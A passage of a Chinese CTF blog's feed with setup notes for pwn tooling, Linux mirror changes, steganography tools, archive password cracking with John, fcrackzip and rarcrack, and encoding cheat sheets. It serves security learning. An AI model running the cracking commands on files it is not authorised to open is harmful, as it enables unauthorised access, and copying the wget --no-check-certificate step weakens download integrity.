keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往左走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'a'</span>  <span class="token comment"># 向左走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    dfs<span class="token punctuation">(</span>sti<span class="token punctuation">,</span> stj<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr>]]></content>
    
    
    <summary type="html">总结了一些做逆向题时可能会用到的便捷算法，争取快人一步</summary>
    
    
    
    <category term="便捷算法" scheme="https://4ss1du0us.github.io/categories/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
    
    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>更换源</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/%E6%9B%B4%E6%8D%A2%E6%BA%90/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/%E6%9B%B4%E6%8D%A2%E6%BA%90/</id>
    <published>2023-03-19T08:11:01.000Z</published>
    <updated>2023-03-22T01:17:48.437Z</updated>
    
    <content type="html"><![CDATA[<h2 id="更换-镜像源（ubuntu-22-04）"><a href="#更换-镜像源（ubuntu-22-04）" class="headerlink" title="更换 镜像源（ubuntu 22.04）"></a>更换 镜像源（ubuntu 22.04）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt<span class="token function">vim</span> sources.list-----------------------------------------------------------------<span class="token comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><span class="token comment"># 预发布软件源，不建议启用</span><span class="token comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span>-----------------------------------------------------------------<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade<span class="token function">sudo</span> <span class="token function">apt-get</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="更换-镜像源（kali-2022-4）"><a href="#更换-镜像源（kali-2022-4）" class="headerlink" title="更换 镜像源（kali 2022.4）"></a>更换 镜像源（kali 2022.4）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt<span class="token function">vim</span> sources.list-----------------------------------------------------------------deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free-----------------------------------------------------------------<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade<span class="token function">sudo</span> <span class="token function">apt-get</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="更换-pip-源"><a href="#更换-pip-源" class="headerlink" title="更换 pip 源"></a>更换 pip 源</h2><ul><li>命令行直接更改</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip config <span class="token builtin class-name">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">在 Ubuntu 和 kali 下更换镜像源和 pip 源</summary>
    
    
    
    <category term="Linux" scheme="https://4ss1du0us.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://4ss1du0us.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Python配置</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/Python%E9%85%8D%E7%BD%AE/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/Python%E9%85%8D%E7%BD%AE/</id>
    <published>2023-03-19T08:10:48.000Z</published>
    <updated>2023-03-22T01:19:35.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装-pip"><a href="#安装-pip" class="headerlink" title="安装 pip"></a>安装 pip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://bootstrap.pypa.io/get-pip.py  --no-check-certificatepython get-pip.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="修改默认-python-版本"><a href="#修改默认-python-版本" class="headerlink" title="修改默认 python 版本"></a>修改默认 python 版本</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/python<span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/bin/python3.10 /usr/bin/python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">在 Linux 下安装 pip ，并在多个 python 版本下更改 python 的默认版本</summary>
    
    
    
    <category term="Linux" scheme="https://4ss1du0us.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://4ss1du0us.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CTF配置</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/CTF%E9%85%8D%E7%BD%AE/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/CTF%E9%85%8D%E7%BD%AE/</id>
    <published>2023-03-19T08:10:39.000Z</published>
    <updated>2023-03-19T08:13:50.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装-32位-库"><a href="#安装-32位-库" class="headerlink" title="安装 32位 库"></a>安装 32位 库</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libc6-dev-i386<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> lib32z1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-Capstone"><a href="#安装-Capstone" class="headerlink" title="安装 Capstone"></a>安装 Capstone</h2><blockquote><p>一个轻量级的多平台架构支持的反汇编架构</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/aquynh/capstone<span class="token builtin class-name">cd</span> capstone<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h2><ul><li>通过 python 的 pip 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-pippip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>通过 git 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Gallopsled/pwntools<span class="token builtin class-name">cd</span> pwntools<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>验证安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python-------------------------------------------<span class="token function">import</span> pwnpwn.asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------from pwn <span class="token function">import</span> *asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------输出：<span class="token string">'1\xc0'</span>-------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-LibcSearcher"><a href="#安装-LibcSearcher" class="headerlink" title="安装 LibcSearcher"></a>安装 LibcSearcher</h2><blockquote><p>在做栈溢出相关的题时，经常会遇到构造 ROP 链的情况。若我们在 IDA 反编译之后没有看到 system 函数，栈题大概率需要泄漏 libc 库中的函数。此时，LibcSearcher 就是最好的选择，可以用它找到偏移地址</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/lieanu/LibcSearcher.git<span class="token builtin class-name">cd</span> LibcSearcher<span class="token function">sudo</span> python setup.py develop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-ROPgadget"><a href="#安装-ROPgadget" class="headerlink" title="安装 ROPgadget"></a>安装 ROPgadget</h2><blockquote><p>用来找 gadget 的，这个安装 pwntools 时自带，如果没有的话可以再手动安装</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/JonathanSalwan/ROPgadget.git<span class="token builtin class-name">cd</span> ROPgadget<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-one-gadget"><a href="#安装-one-gadget" class="headerlink" title="安装 one_gadget"></a>安装 one_gadget</h2><blockquote><p>one_gadget 可以用来动态查找执行 libc 动态库中的 system 执行函数，可以一步到位。在做相关堆题时尤为有效<br>用来寻找 libc 库中的 <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code> 可以一个 gadget 就可以 getshell，需要注意 one_gadget 相关限制条件</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby<span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-glibc-all-in-one"><a href="#安装-glibc-all-in-one" class="headerlink" title="安装 glibc-all-in-one"></a>安装 glibc-all-in-one</h2><blockquote><p>在做堆题时，经常遇到不同版本的 libc，这时 glibc-all-in-one 可以很好的派上用场，动态更改 elf 文件 libc 版本</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git<span class="token builtin class-name">cd</span> glibc-all-in-one./update_list<span class="token function">cat</span> list./download <span class="token operator">&lt;</span>需要的 libc 版本<span class="token operator">></span>（例如：2.31-0ubuntu9_amd64）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-qemu"><a href="#安装-qemu" class="headerlink" title="安装 qemu"></a>安装 qemu</h2><blockquote><p>这是 arm 的 pwn 环境，前期可以不安装，但是终究是逃不过的，建议一步到位</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system qemu-user-static binfmt-support<span class="token comment"># 安装依赖库</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> gcc-arm-linux-gnueabi<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-zsteg"><a href="#安装-zsteg" class="headerlink" title="安装 zsteg"></a>安装 zsteg</h2><blockquote><p>图像隐写神器</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-basecrack"><a href="#安装-basecrack" class="headerlink" title="安装 basecrack"></a>安装 basecrack</h2><blockquote><p>Base 编码分析工具</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/mufeedvh/basecrack.git<span class="token builtin class-name">cd</span> basecrackpip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txtpython basecrack.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装-32位-库&quot;&gt;&lt;a href=&quot;#安装-32位-库&quot; class=&quot;headerlink&quot; title=&quot;安装 32位 库&quot;&gt;&lt;/a&gt;安装 32位 库&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-bash&quot; data-lang</summary>
      
    
    
    
    <category term="Linux" scheme="https://4ss1du0us.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://4ss1du0us.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>音频隐写</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/</id>
    <published>2023-03-19T07:57:31.000Z</published>
    <updated>2023-03-19T08:00:33.913Z</updated>
    
    <content type="html"><![CDATA[<h2 id="wav-隐写"><a href="#wav-隐写" class="headerlink" title="wav 隐写"></a>wav 隐写</h2><blockquote><p>音频分析软件 Audacity 下载地址：<a href="https://www.audacityteam.org/">Audacity ® | Free</a></p><p>音频隐写软件 DeepSound 下载地址：<a href="http://www.jpinsoft.net/deepsound/download.aspx">DeepSound -&gt; Download</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;wav-隐写&quot;&gt;&lt;a href=&quot;#wav-隐写&quot; class=&quot;headerlink&quot; title=&quot;wav 隐写&quot;&gt;&lt;/a&gt;wav 隐写&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;音频分析软件 Audacity 下载地址：&lt;a href=&quot;https://www</summary>
      
    
    
    
    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>压缩包密码爆破</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</id>
    <published>2023-03-19T07:57:20.000Z</published>
    <updated>2023-03-19T08:00:09.411Z</updated>
    
    <content type="html"><![CDATA[<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> john<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>用法：<br><code>John -wordlist=&lt;字典路径&gt;</code> 【<code>-wordlist</code> —— 指定字典爆破】</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zip2john <span class="token operator">&lt;</span>文件名<span class="token operator">></span> <span class="token operator">>></span>password.txt <span class="token comment"># 把密码信息提取出来</span>john password <span class="token parameter variable">--show</span> <span class="token comment"># 查看密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> fcrackzip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>用法：<br><code>fcrackzip -b -c &#39;aA1!&#39; -l 1-10 -u &lt;zip文件名&gt;</code></li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left">-b</td><td style="text-align:left">代表 暴力破解</td></tr><tr><td style="text-align:left">-c</td><td style="text-align:left">指定使用的字符集</td></tr><tr><td style="text-align:left">-l</td><td style="text-align:left">限制密码长度</td></tr></tbody></table></div><hr><h2 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h2><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> rarcrack<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libxml2-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>用法：<br><code>rarcrack &lt;文件名&gt; --threads &lt;线程数&gt; --type &lt;rar/zip/7z&gt;</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;John-the-Ripper&quot;&gt;&lt;a href=&quot;#John-the-Ripper&quot; class=&quot;headerlink&quot; title=&quot;John the Ripper&quot;&gt;&lt;/a&gt;John the Ripper&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;下载安装：&lt;/li&gt;
&lt;</summary>
      
    
    
    
    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>图像隐写</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99/</id>
    <published>2023-03-19T07:57:08.000Z</published>
    <updated>2023-03-19T07:59:46.375Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析文件里面包含的隐藏文件-——-binwalk"><a href="#分析文件里面包含的隐藏文件-——-binwalk" class="headerlink" title="分析文件里面包含的隐藏文件 —— binwalk"></a>分析文件里面包含的隐藏文件 —— binwalk</h2><ul><li><code>binwalk &lt;文件名&gt;</code><br>可直接扫描，通过扫描能够发现目标文件中包含的所有可识别的文件类型  </li><li><code>binwalk -e &lt;文件名&gt;</code><br>扫描，extract 自动提取已知的文件类型</li></ul><hr><h2 id="检测-png-和-bmp-图片里的隐写数据-——-zsteg"><a href="#检测-png-和-bmp-图片里的隐写数据-——-zsteg" class="headerlink" title="检测 png 和 bmp 图片里的隐写数据 —— zsteg"></a>检测 png 和 bmp 图片里的隐写数据 —— zsteg</h2><ul><li>安装：<code>sudo gem install zsteg</code></li><li><code>zsteg &lt;文件名&gt;</code><br>查看 LSB 分析结果</li><li><code>zsteg &lt;文件名&gt; --all</code><br>快速提取所有隐藏信息</li><li><code>zsteg -e &quot;偏移地址&quot; &lt;源文件名&gt; &gt; &lt;提取文件的文件名&gt;</code><br>提取文件</li></ul><hr><h2 id="文件分离-——-foremost"><a href="#文件分离-——-foremost" class="headerlink" title="文件分离 —— foremost"></a>文件分离 —— foremost</h2><ul><li><code>foremost &lt;文件名&gt;</code><ol><li>会形成一个 output 文件夹，里面存放的是分离出来的文件</li><li>如果已经知道文件中包含了一个其他的文件类型，通过 <code>binwalk</code> 得到偏移地址，可以直接在 winhex 中定位到该偏移地址，然后将文件的内容直接复制到一个新建的文件中，即可得到包含的文件</li></ol></li></ul><hr><h2 id="打印文件中可打印字符串"><a href="#打印文件中可打印字符串" class="headerlink" title="打印文件中可打印字符串"></a>打印文件中可打印字符串</h2><ul><li><code>strings &lt;文件名&gt;</code></li><li><code>strings &lt;文件名&gt; | grep flag</code></li></ul><hr><h2 id="轻量级的图片隐写工具-——-Stegsolve"><a href="#轻量级的图片隐写工具-——-Stegsolve" class="headerlink" title="轻量级的图片隐写工具 —— Stegsolve"></a>轻量级的图片隐写工具 —— Stegsolve</h2><ul><li>下载地址：<a href="http://www.caesum.com/handbook/Stegsolve.jar">Stegsolve.jar（win/linux）</a></li><li>安装 java jdk 环境，用 <code>java -version</code> 验证</li><li>win 下通过 cmd 打开：<br><code>javaw -jar &lt;Stegsolve.jar 所在路径&gt;</code></li><li>linux 下打开：<br><code>java -jar &lt;Stegsolve.jar 所在路径&gt;</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;分析文件里面包含的隐藏文件-——-binwalk&quot;&gt;&lt;a href=&quot;#分析文件里面包含的隐藏文件-——-binwalk&quot; class=&quot;headerlink&quot; title=&quot;分析文件里面包含的隐藏文件 —— binwalk&quot;&gt;&lt;/a&gt;分析文件里面包含的隐藏文件 </summary>
      
    
    
    
    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>各种加密方法的特点</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/</id>
    <published>2023-03-19T07:56:58.000Z</published>
    <updated>2023-03-19T08:04:20.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Base-家族"><a href="#Base-家族" class="headerlink" title="Base 家族"></a>Base 家族</h2><blockquote><p>BaseCrack 下载地址：<a href="https://github.com/mufeedvh/basecrack">basecrack</a><br>安装依赖文件：<code>pip3 install -r requirements.txt</code><br>运行：<code>python basecrack.py</code></p><p>在 BaseCrack 的帮助下，可以一次性对任意模式下的多重 Base 编码数据进行解码</p></blockquote><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><ul><li><p>经过 Base64 编码后的字符串长度一定会被4整除（包括后缀等号）</p></li><li><p>等号不超过两个</p></li></ul><hr><h3 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a>Base91</h3><ul><li>从 ASCii 字符（0x21 - 0x7E）中除 <code>&#39;-&#39;</code>（0x2D）、<code>&#39;\&#39;</code>（0x5C）、<code>&#39;&#39;&#39;</code>（0x27）外的其他 91 个可打印字符组成</li></ul><hr><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><ul><li>MD5 值是 32位 由数字 0-9，字母 a-f 组成的字符串（也有可能是16位）</li></ul><hr><h2 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h2><ul><li>有 <code>&#39;%&#39;</code></li></ul><hr><h2 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h2><ul><li>用 <code>&#39;&gt;&#39;</code>、<code>&#39;&lt;&#39;</code>、<code>&#39;+&#39;</code>、<code>&#39;-&#39;</code>、<code>&#39;.&#39;</code>、<code>&#39;,&#39;</code>、<code>&#39;[&#39;</code>、<code>&#39;]&#39;</code> 八种符号组成</li><li>例如：<br>明文 Hello World!，加密后密文为：++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.———.————.&gt;+.&gt;.</li></ul><hr><h2 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h2><ul><li>存在很多 <code>&#39;.&#39;</code>、<code>&#39;!&#39;</code>、<code>&#39;?&#39;</code> 符号</li></ul><hr><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><hr><h2 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h2><ul><li><p>Rabbit 加密开头部分通常为：<code>U2FsdGVkX1</code></p></li><li><p>明显密文里​​ <code>&#39;+&#39;</code> 比较多，并且经常有 <code>&#39;/&#39;</code></p></li><li><p>例如：<br>明文 I Love You 521，无密钥，加密后密文为：<strong>U2FsdGVkX1</strong>9DvuEo5PvBA8TuLrM2t+EZBvUkzlAa<br>明文 I Love You 521，密钥为 666，加密后密文为：<strong>U2FsdGVkX1</strong>8w6vxXxux/ivRVwo3xMzTxmUyk7cHz</p></li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Base-家族&quot;&gt;&lt;a href=&quot;#Base-家族&quot; class=&quot;headerlink&quot; title=&quot;Base 家族&quot;&gt;&lt;/a&gt;Base 家族&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;BaseCrack 下载地址：&lt;a href=&quot;https://githu</summary>
      
    
    
    
    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>ZIP伪加密</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</id>
    <published>2023-03-19T07:56:39.000Z</published>
    <updated>2023-03-19T07:58:53.631Z</updated>
    
